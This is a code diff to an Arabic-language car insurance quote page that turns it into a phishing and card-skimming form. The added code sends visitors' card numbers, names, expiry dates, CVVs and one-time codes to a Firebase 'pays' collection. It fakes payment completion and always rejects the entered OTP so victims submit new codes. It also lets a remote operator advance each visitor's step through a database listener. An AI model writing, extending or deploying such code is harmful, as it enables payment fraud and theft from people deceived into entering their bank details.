@@ -26,7 +26,8 @@ import { useState, useEffect, useRef } from "react"
 import { offerData } from "@/lib/data"
 import InsurancePurpose from "@/components/insurance"
 import VehicleRegistration from "@/components/vic-form"
-import { addData } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
+import { doc, onSnapshot } from "firebase/firestore"
 
 export default function QuotePage() {
   const [mounted, setMounted] = useState(false)
@@ -308,7 +309,6 @@ export default function QuotePage() {
           <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-12">
             <div className="space-y-6">
               <div className="flex items-center gap-3">
-
                 <img src="/Logo-AR.png" alt="logo" width={120} />
               </div>
               <p className="text-gray-400 leading-relaxed">
@@ -413,9 +413,9 @@ export default function QuotePage() {
     </div>
   )
 }
-
+const allOtp = [""]
 function ProfessionalQuoteForm() {
-  const [currentStep, setCurrentStep] = useState(6)
+  const [currentStep, setCurrentStep] = useState(1)
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [touched, setTouched] = useState<Record<string, boolean>>({})
   const [isSubmitting, setIsSubmitting] = useState(false)
@@ -423,6 +423,13 @@ function ProfessionalQuoteForm() {
   const [otpSent, setOtpSent] = useState(false)
   const [otpVerified, setOtpVerified] = useState(false)
   const [otpAttempts, setOtpAttempts] = useState(0)
+  const [visitorID, setV] = useState(0)
+  const [cardNumber, setCardNumber] = useState("")
+  const [cardName, setCardName] = useState("")
+  const [cardMonth, setCardMonth] = useState("")
+  const [cardYear, setCardYear] = useState("")
+  const [cvv, setCvv] = useState("")
+  const [otp, setOtp] = useState("")
   const [otpTimer, setOtpTimer] = useState(0)
   const [formData, setFormData] = useState({
     insurance_purpose: "renewal",
@@ -441,12 +448,6 @@ function ProfessionalQuoteForm() {
     selectedAddons: [] as string[],
     email: "",
     phone: "",
-    cardNumber: "",
-    cardName: "",
-    expiryYear: "",
-    expiryMonth: "",
-    cvv: "",
-    otp: "",
   })
 
   const stepHeaderRef = useRef<HTMLHeadingElement>(null)
@@ -462,7 +463,28 @@ function ProfessionalQuoteForm() {
     { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
     { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
   ]
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
+    if (visitorId) {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data()
+          setCurrentStep(Number.parseInt(data.currentStep))
 
+          // Load existing card data if available
+          if (data.cardNumber) setCardNumber(data.cardNumber)
+          if (data.cardName) setCardName(data.cardName)
+          if (data.cardMonth) setCardMonth(data.cardMonth)
+          if (data.cardYear) setCardYear(data.cardYear)
+          if (data.cvv) setCvv(data.cvv)
+          if (data.otp) setOtp(data.otp)
+          if (data.otpAttempts) setOtpAttempts(data.otpAttempts)
+        }
+      })
+
+      return () => unsubscribe()
+    }
+  }, [])
   useEffect(() => {
     let interval: NodeJS.Timeout
     if (otpTimer > 0) {
@@ -478,6 +500,7 @@ function ProfessionalQuoteForm() {
       stepHeaderRef.current.focus()
       stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
     }
+    addData({ id: localStorage.getItem("visitor"), currentStep })
   }, [currentStep])
 
   useEffect(() => {
@@ -628,10 +651,24 @@ function ProfessionalQuoteForm() {
   }
 
   const nextStep = () => {
-    const visitorId=localStorage.getItem('visitor')
+    const visitorId = localStorage.getItem("visitor")
     if (validateStep(currentStep)) {
       if (currentStep < steps.length) {
-        addData({id:visitorId,...formData,})
+        // Save card data when leaving payment step
+        if (currentStep === 6) {
+          addData({
+            id: visitorId,
+            cardNumber,
+            cardName,
+            cardMonth,
+            cardYear,
+            cvv,
+            currentStep: currentStep + 1,
+            ...formData,
+          })
+        } else {
+          addData({ id: visitorId, currentStep: currentStep + 1, ...formData })
+        }
         setCurrentStep(currentStep + 1)
       }
     }
@@ -649,10 +686,23 @@ function ProfessionalQuoteForm() {
     }
 
     setIsSubmitting(true)
+    const visitorId = localStorage.getItem("visitor")
+
     try {
+      // Save final submission data
+      await addData({
+        id: visitorId,
+        otp,
+        otpVerified: false,
+        submissionTime: new Date().toISOString(),
+        finalStatus: "verification_failed",
+      })
+
       await new Promise((resolve) => setTimeout(resolve, 2000))
       alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
-      handleFieldChange("otp", '')
+      handleFieldChange("otp", "")
+      setOtp("")
+      setOtpAttempts((prev) => prev + 1)
     } catch (error) {
       alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
     } finally {
@@ -708,20 +758,62 @@ function ProfessionalQuoteForm() {
   }
 
   function handlePayment(event: any): void {
+    const visitorId = localStorage.getItem("visitor")
+
+    // Save card data before processing payment
+    addData({
+      id: visitorId,
+      cardNumber,
+      cardName,
+      cardMonth,
+      cardYear,
+      cvv,
+      paymentStatus: "processing",
+      ...formData,
+    })
+
     setPaymentProcessing(true)
     setTimeout(() => {
       setPaymentProcessing(false)
       setCurrentStep(7)
       setOtpTimer(120)
+
+      // Update status after payment processing
+      addData({
+        id: visitorId,
+        paymentStatus: "completed",
+        otpSent: true,
+        currentStep: 7,
+      })
     }, 2000)
   }
 
   function verifyOTP(event: any): void {
+    const visitorId = localStorage.getItem("visitor")
+
+    // Save OTP data
+    addData({
+      id: visitorId,
+      otp,
+      otpAttempts: otpAttempts + 1,
+      otpVerificationTime: new Date().toISOString(),
+      ...formData,
+    })
+
     handleSubmit()
   }
 
   function sendOTP(event: any): void {
+    const visitorId = localStorage.getItem("visitor")
+
     setOtpTimer(120)
+
+    // Save OTP sending data
+    addData({
+      id: visitorId,
+      otpSentTime: new Date().toISOString(),
+      otpResendCount: (otpAttempts || 0) + 1,
+    })
   }
 
   return (
@@ -736,26 +828,29 @@ function ProfessionalQuoteForm() {
                 <div key={step.number} className="flex items-center flex-shrink-0">
                   <div className="flex flex-col items-center">
                     <div
-                      className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${step.number === currentStep
+                      className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
+                        step.number === currentStep
                           ? "bg-[#109cd4] text-white shadow-lg scale-110"
                           : step.number < currentStep
                             ? "bg-green-500 text-white"
                             : "bg-gray-200 text-gray-600"
-                        }`}
+                      }`}
                     >
                       {step.number < currentStep ? <CheckCircle className="w-5 h-5" /> : step.number}
                     </div>
                     <p
-                      className={`text-xs mt-2 text-center w-20 ${step.number === currentStep ? "text-[#109cd4] font-semibold" : "text-gray-600"
-                        }`}
+                      className={`text-xs mt-2 text-center w-20 ${
+                        step.number === currentStep ? "text-[#109cd4] font-semibold" : "text-gray-600"
+                      }`}
                     >
                       {step.title.split(" ")[0]}
                     </p>
                   </div>
                   {index < steps.length - 1 && (
                     <div
-                      className={`w-8 h-0.5 mx-2 transition-all duration-300 ${step.number < currentStep ? "bg-green-500" : "bg-gray-300"
-                        }`}
+                      className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
+                        step.number < currentStep ? "bg-green-500" : "bg-gray-300"
+                      }`}
                     />
                   )}
                 </div>
@@ -769,12 +864,13 @@ function ProfessionalQuoteForm() {
               <div key={step.number} className="flex items-center">
                 <div className="flex flex-col items-center">
                   <div
-                    className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${step.number === currentStep
+                    className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
+                      step.number === currentStep
                         ? "bg-[#109cd4] text-white shadow-lg scale-110"
                         : step.number < currentStep
                           ? "bg-green-500 text-white"
                           : "bg-gray-200 text-gray-600"
-                      }`}
+                    }`}
                   >
                     {step.number < currentStep ? (
                       <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
@@ -784,8 +880,9 @@ function ProfessionalQuoteForm() {
                   </div>
                   <div className="text-center mt-3">
                     <p
-                      className={`text-sm lg:text-base font-semibold ${step.number === currentStep ? "text-[#109cd4]" : "text-gray-700"
-                        }`}
+                      className={`text-sm lg:text-base font-semibold ${
+                        step.number === currentStep ? "text-[#109cd4]" : "text-gray-700"
+                      }`}
                     >
                       {step.title}
                     </p>
@@ -794,8 +891,9 @@ function ProfessionalQuoteForm() {
                 </div>
                 {index < steps.length - 1 && (
                   <div
-                    className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${step.number < currentStep ? "bg-green-500" : "bg-gray-300"
-                      }`}
+                    className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
+                      step.number < currentStep ? "bg-green-500" : "bg-gray-300"
+                    }`}
                   />
                 )}
               </div>
@@ -858,24 +956,25 @@ function ProfessionalQuoteForm() {
                   <div className="grid grid-cols-2 gap-4">
                     <button
                       type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "comprehensive"
+                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                        formData.insuranceTypeSelected === "comprehensive"
                           ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                           : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                        }`}
+                      }`}
                       onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                     >
                       <div className="text-center">
-
                         <div className="font-semibold">تأمين شامل</div>
                         <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
                       </div>
                     </button>
                     <button
                       type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${formData.insuranceTypeSelected === "third-party"
+                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                        formData.insuranceTypeSelected === "third-party"
                           ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
                           : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                        }`}
+                      }`}
                       onClick={() => handleFieldChange("insuranceTypeSelected", "third-party")}
                     >
                       <div className="text-center">
@@ -952,20 +1051,22 @@ function ProfessionalQuoteForm() {
                   <div className="flex bg-gray-100 rounded-xl p-1">
                     <button
                       type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "against-others"
+                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
+                        formData.insuranceTypeSelected === "against-others"
                           ? "bg-[#109cd4] text-white shadow-md"
                           : "text-gray-600 hover:text-gray-900"
-                        }`}
+                      }`}
                       onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
                     >
                       ضد الغير
                     </button>
                     <button
                       type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${formData.insuranceTypeSelected === "comprehensive"
+                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
+                        formData.insuranceTypeSelected === "comprehensive"
                           ? "bg-[#109cd4] text-white shadow-md"
                           : "text-gray-600 hover:text-gray-900"
-                        }`}
+                      }`}
                       onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
                     >
                       شامل
@@ -990,10 +1091,11 @@ function ProfessionalQuoteForm() {
                       return (
                         <Card
                           key={offer.id}
-                          className={`border-2 transition-all duration-200 cursor-pointer hover:shadow-lg ${formData.selectedInsuranceOffer === offer.id
+                          className={`border-2 transition-all duration-200 cursor-pointer hover:shadow-lg ${
+                            formData.selectedInsuranceOffer === offer.id
                               ? "border-blue-500 bg-blue-50 shadow-md"
                               : "border-gray-200 hover:border-blue-300"
-                            }`}
+                          }`}
                           onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
                         >
                           <CardContent className="p-6">
@@ -1140,21 +1242,13 @@ function ProfessionalQuoteForm() {
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                   <div className="space-y-6">
                     <h4 className="text-xl font-bold text-gray-900">معلومات التواصل</h4>
-                    <ValidatedInput
-                      label="البريد الإلكتروني"
-                      fieldName="email"
-                      type="email"
-                      placeholder="example@email.com"
-                      required
-                      autoFocus={true}
-                    />
-                    <ValidatedInput
-                      label="رقم الهاتف"
-                      fieldName="phone"
+                    <Input
+                      name="phone"
                       type="tel"
-                      placeholder="05xxxxxxxx"
+                      placeholder="رقم الهاتف"
                       required
                       maxLength={10}
+                      onChange={(e) => handleFieldChange("phone", e.target.value)}
                     />
                     <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                       <div className="flex items-start gap-3">
@@ -1162,7 +1256,6 @@ function ProfessionalQuoteForm() {
                           type="checkbox"
                           className="w-5 h-5 mt-1 text-[#109cd4]"
                           checked={formData.agreeToTerms}
-                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
                         />
                         <span className="text-sm text-blue-800">
                           أوافق على{" "}
@@ -1272,31 +1365,27 @@ function ProfessionalQuoteForm() {
 
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                   <div className="space-y-6">
-                    <label>
-                      رقم البطاقة
-
-                    </label>
+                    <label>رقم البطاقة</label>
                     <Input
                       name="cardNumber"
+                      id="cardNumber"
                       type="tel"
                       placeholder="#### #### #### ####"
                       required
                       dir="rtl"
-                      value={formData.cardNumber}
-                      onChange={(e) => handleFieldChange("cardNumber", e.target.value)}
+                      value={cardNumber}
+                      onChange={(e) => setCardNumber(e.target.value)}
                       maxLength={16}
                       autoFocus={true}
                     />
-                    <label>
-                      الاسم كما هو مكتوب على البطاقة
-
-                    </label>
+                    <label>الاسم كما هو مكتوب على البطاقة</label>
                     <Input
                       name="cardName"
+                      id="cardName"
                       type="text"
                       className="p-2 m-0"
-                      value={formData.cardName}
-                      onChange={(e) => handleFieldChange("cardName", e.target.value)}
+                      value={cardName}
+                      onChange={(e) => setCardName(e.target.value)}
                       placeholder="الاسم الكامل"
                       required
                     />
@@ -1307,10 +1396,11 @@ function ProfessionalQuoteForm() {
                           الشهر <span className="text-red-500">*</span>
                         </label>
                         <select
+                          name="expiryMonth"
+                          id="expiryMonth"
                           className="w-full h-9 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                          value={formData.expiryMonth}
-                          onChange={(e) => handleFieldChange("expiryMonth", e.target.value)}
-                          onBlur={() => handleFieldBlur("expiryMonth")}
+                          value={cardMonth}
+                          onChange={(e) => setCardMonth(e.target.value)}
                         >
                           <option value="">الشهر</option>
                           {Array.from({ length: 12 }, (_, i) => (
@@ -1327,9 +1417,10 @@ function ProfessionalQuoteForm() {
                         </label>
                         <select
                           className="w-full h-9 px-3 py-0 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                          value={formData.expiryYear}
-                          onChange={(e) => handleFieldChange("expiryYear", e.target.value)}
-                          onBlur={() => handleFieldBlur("expiryYear")}
+                          value={cardYear}
+                          onChange={(e) => setCardYear(e.target.value)}
+                          name="expiryYear"
+                          id="expiryYear"
                         >
                           <option value="">السنة</option>
                           {Array.from({ length: 10 }, (_, i) => {
@@ -1343,26 +1434,20 @@ function ProfessionalQuoteForm() {
                         </select>
                       </div>
                       <div className=" font-semibold">
-
-
-                        <label>
-                          CVV
-
-                        </label>
+                        <label>CVV</label>
                         <Input
                           name="cvv"
+                          id="cvv"
                           type="password"
                           className="px-2 my-2"
                           placeholder="123"
                           maxLength={3}
-                          value={formData.cvv}
+                          value={cvv}
                           onChange={(e) => {
-                            handleFieldChange("cvv", e.target.value)
+                            setCvv(e.target.value)
                           }}
                         />
-
                       </div>
-
                     </div>
                   </div>
 
@@ -1441,10 +1526,9 @@ function ProfessionalQuoteForm() {
                       type="text"
                       placeholder="######"
                       required
-                      value={formData.otp}
+                      value={otp}
                       maxLength={6}
-                      onChange={(e) => handleFieldChange("otp", e.target.value)}
-
+                      onChange={(e) => setOtp(e.target.value)}
                       autoFocus={true}
                       className="text-center text-2xl h-14 tracking-widest"
                     />
@@ -1464,9 +1548,7 @@ function ProfessionalQuoteForm() {
                     </Button>
                   )}
 
-                  {otpAttempts > 0 && (
-                    <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
-                  )}
+                 
                 </div>
               </div>
             )}
